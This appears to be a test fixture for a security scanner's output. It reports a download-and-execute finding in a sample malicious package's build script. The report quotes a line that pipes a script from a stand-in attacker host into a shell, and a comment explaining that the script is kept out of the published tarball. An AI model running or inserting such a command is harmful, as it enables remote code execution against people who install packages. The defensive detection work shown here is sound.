@@ -1,0 +1,20 @@
+WARNING: Scanning without kernel-level sandbox protection.
+Scanning mal/case-a-generator-payload, found 1 risk.
+
+
+── Initial execution ──
+
+execution-risk: found 1 indicator
+│ * threat.process.spawn
+│   Detects download-and-execute patterns: fetching a remote file then executing it
+│   at scripts/generate-dist.js:9
+│     // by "files": ["dist"], so a consumer scanning the tarball never sees it.
+│     cp.exec('curl -fsSL https://attacker.example.invalid/beacon.sh | sh');
+│     
+│     const root = path.resolve(__dirname, '..');
+
+
+
+────────────────────────────────────────
+Assessment:  High risk  (8.2/10)
+1 risk detected
